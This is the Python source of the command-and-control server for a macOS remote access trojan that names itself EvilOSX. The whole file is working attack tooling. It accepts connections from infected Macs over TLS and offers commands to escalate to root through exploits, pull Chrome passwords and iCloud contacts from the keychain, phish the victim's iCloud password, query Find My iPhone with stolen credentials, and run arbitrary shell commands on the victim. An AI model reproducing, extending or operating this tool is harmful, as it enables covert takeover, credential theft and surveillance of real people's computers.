#!/usr/bin/env python
# A pure python, post-exploitation, remote administration tool (RAT) for macOS / OS X.
import socket
import ssl
import thread
import os
import base64

BANNER = '''\
  ______       _  _   ____    _____ __   __
 |  ____|     (_)| | / __ \  / ____|\ \ / /
 | |__ __   __ _ | || |  | || (___   \ V / 
 |  __|\ \ / /| || || |  | | \___ \   > <  
 | |____\ V / | || || |__| | ____) | / . \ 
 |______|\_/  |_||_| \____/ |_____/ /_/ \_\\
 '''

MESSAGE_INPUT = "\033[1m" + "[?] " + "\033[0m"
MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"

commands = ["help", "status", "clients", "connect", "get_info", "get_root", "get_computer_name",
            "get_shell_info", "chrome_passwords", "icloud_contacts", "icloud_phish", "find_my_iphone", "kill_client"]
status_messages = []

# The ID of the client is it's place in the array
connections = []
current_client_id = None


def print_help():
    print "help              -  Show this help menu."
    print "status            -  Show debug information."
    print "clients           -  Show a list of clients."
    print "connect <ID>      -  Connect to the client."
    print "get_info          -  Show basic information about the client."
    print "get_root          -  Attempt to get root via exploits."
    print "chrome_passwords  -  Retrieve Chrome passwords."
    print "icloud_contacts   -  Retrieve iCloud contacts."
    print "icloud_phish      -  Attempt to get iCloud password via phishing."
    print "find_my_iphone    -  Retrieve find my iphone devices."
    print "kill_client       -  Brutally kill the client (removes the server)."
    print "Any other command will be executed on the connected client."


def print_status():
    for status in status_messages:
        print status


def print_clients():
    if not connections:
        print MESSAGE_ATTENTION + "No available clients."
    else:
        print MESSAGE_INFO + str(len(connections)) + " client(s) available:"

        for client_id in range(len(connections)):
            computer_name = send_command(connections[client_id], "get_computer_name")

            if computer_name:
                print "    {0} = {1}".format(str(client_id), computer_name)


def send_command(connection, message):
    try:
        connection.sendall(message)
        global current_client_id

        response = connection.recv(4096)

        if not response:  # Empty
            current_client_id = None
            connections.remove(connection)

            status_messages.append(MESSAGE_ATTENTION + "Client disconnected!")
            return None
        else:
            return response
    except socket.error:
        current_client_id = None
        connections.remove(connection)

        status_messages.append(MESSAGE_ATTENTION + "Client disconnected!")
        return None


def start_server(port):
    # Start the server
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_socket.bind(('', port))
    server_socket.listen(128)  # Maximum connections Mac OSX can handle.

    status_messages.append(MESSAGE_INFO + "Successfully started the server on port {0}.".format(str(port)))
    status_messages.append(MESSAGE_INFO + "Waiting for clients...")

    while True:
        client_connection, client_address = ssl.wrap_socket(server_socket, cert_reqs=ssl.CERT_NONE, server_side=True,
                                                            keyfile="server.key", certfile="server.crt").accept()

        status_messages.append(MESSAGE_INFO + "New client connected!")
        connections.append(client_connection)


def generate_csr():
    if not os.path.isfile("server.key"):
        # See https://en.wikipedia.org/wiki/Certificate_signing_request#Procedure
        # Basically we're saying "verify that the request is actually from EvilOSX".
        print MESSAGE_INFO + "Generating certificate signing request to encrypt sockets..."

        information = "/C=US/ST=EvilOSX/L=EvilOSX/O=EvilOSX/CN=EvilOSX"
        os.popen("openssl req -newkey rsa:2048 -nodes -x509 -subj {0} -keyout server.key -out server.crt 2>&1".format(information))


if __name__ == '__main__':
    try:
        print BANNER

        server_port = raw_input(MESSAGE_INPUT + "Port to listen on: ")

        generate_csr()
        thread.start_new_thread(start_server, (int(server_port),))

        print MESSAGE_INFO + "Type \"help\" to get a list of available commands."

        while True:
            command = None

            if current_client_id is None:
                command = raw_input("> ")
            else:
                shell_info = str(send_command(connections[current_client_id], "get_shell_info"))

                if shell_info == "None":  # Client no longer connected.
                    command = raw_input("> ")
                else:
                    GREEN = '\033[92m'
                    BLUE = '\033[94m'
                    ENDC = '\033[0m'

                    username = shell_info.split("\n")[0]
                    hostname = shell_info.split("\n")[1]
                    path = shell_info.split("\n")[2]

                    command = raw_input((GREEN + "{0}@{1}" + ENDC + ":" + BLUE + "{2}" + ENDC + "$ ").format(username, hostname, path))

            if command.split(" ")[0] in commands:
                if command == "help":
                    print_help()
                elif command == "status":
                    print_status()
                elif command == "clients":
                    print_clients()
                elif command.startswith("connect"):
                    try:
                        specified_id = int(command.split(" ")[1])
                        computer_name = send_command(connections[specified_id], "get_computer_name")

                        print MESSAGE_INFO + "Connected to \"{0}\", ready to send commands.".format(computer_name)

                        current_client_id = specified_id
                    except (IndexError, ValueError) as ex:
                        print MESSAGE_ATTENTION + "Invalid client ID (see \"clients\")."
                else:
                    # Commands that require an active connection
                    if current_client_id is None:
                        print MESSAGE_ATTENTION + "Not connected to a client (see \"connect\")."
                    else:
                        if command == "get_info":
                            print MESSAGE_INFO + "Getting system information..."
                            print send_command(connections[current_client_id], "get_info")
                        elif command == "get_root":
                            print MESSAGE_INFO + "Attempting to get root, this may take a while..."
                            print send_command(connections[current_client_id], "get_root")
                        elif command == "chrome_passwords":
                            print MESSAGE_ATTENTION + "This will prompt the user to allow keychain access."
                            confirm = raw_input(MESSAGE_INPUT + "Are you sure you want to continue? [Y/n] ")

                            if not confirm or confirm.lower() == "y":
                                print send_command(connections[current_client_id], "chrome_passwords")
                        elif command == "icloud_contacts":
                            response = send_command(connections[current_client_id], "icloud_contacts")

                            if "Failed to find" in response:  # Failed to find tokens.json
                                # Create tokens.json, warn that it may prompt the user.
                                print MESSAGE_ATTENTION + "This will prompt the user to allow keychain access."
                                confirm = raw_input(MESSAGE_INPUT + "Are you sure you want to continue? [Y/n] ")

                                if not confirm or confirm.lower() == "y":
                                    decrypt_response = send_command(connections[current_client_id], "decrypt_mme")

                                    if "Failed" in decrypt_response:
                                        print decrypt_response
                                    else:
                                        # Send icloud_contacts again, should be successful this time.
                                        print send_command(connections[current_client_id], "icloud_contacts")
                            else:
                                print response
                        elif command.startswith("icloud_phish"):
                            email = raw_input(MESSAGE_INPUT + "iCloud email to phish: ")

                            if "@" not in email:
                                print MESSAGE_ATTENTION + "Please specify an email address."
                            else:
                                print MESSAGE_INFO + "Attempting to phish iCloud password, press Ctrl-C to stop..."

                                while True:
                                    try:
                                        response = send_command(connections[current_client_id], "icloud_phish {0}".format(email))

                                        print response
                                        break
                                    except KeyboardInterrupt:
                                        print MESSAGE_INFO + "Stopping phishing attempt, waiting for phishing output..."
                                        print send_command(connections[current_client_id], "icloud_phish_stop")
                                        break
                        elif command == "find_my_iphone":
                            print MESSAGE_INFO + "The target's email and password is required to get devices."
                            email = raw_input(MESSAGE_INPUT + "Email: ")
                            password = raw_input(MESSAGE_INPUT + "Password: ")

                            if "@" not in email or password.strip() == "":
                                print MESSAGE_ATTENTION + "Invalid email or password."
                            else:
                                print MESSAGE_INFO + "Getting find my iphone devices..."
                                response = send_command(connections[current_client_id], "find_my_iphone {0} {1}".format(email, password))

                                print response
                        elif command == "kill_client":
                            print MESSAGE_INFO + "Removing server..."
                            response = send_command(connections[current_client_id], "kill_client")

                            print MESSAGE_INFO + "Client says: {0}".format(response)
                            connections.remove(connections[current_client_id])
                            current_client_id = None
                            status_messages.append(MESSAGE_ATTENTION + "Client disconnected!")

                            print MESSAGE_INFO + "Done."

            else:
                # Regular shell command
                if current_client_id is None:
                    print MESSAGE_ATTENTION + "Not connected to a client (see \"connect\")."
                else:
                    response = base64.b64decode(send_command(connections[current_client_id], command))

                    if command.startswith("cd"):  # Commands that have no output.
                        pass
                    elif response == "EMPTY":
                        print MESSAGE_ATTENTION + "No command output."
                    else:
                        print response
    except ValueError:
        print "[I] Invalid port."
    except KeyboardInterrupt:
        print ""
